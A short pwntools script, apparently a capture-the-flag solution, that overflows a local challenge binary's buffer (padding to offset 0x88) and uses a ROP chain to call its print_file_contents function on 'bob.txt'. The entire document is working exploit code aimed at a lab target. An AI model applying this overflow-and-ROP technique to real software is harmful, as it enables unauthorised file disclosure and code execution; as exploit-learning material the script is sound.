from pwn import *

context.binary = elf = ELF("./challenge")
# p = process("./challenge");
p = remote("localhost", 32834)

rop = ROP(elf)
rop.call(rop.ret)
rop.print_file_contents(0x400c59)

payload = b"bob.txt\x00"
payload += b"A"*(0x88-len(payload))
payload += rop.chain()

p.sendline(payload)

p.interactive();
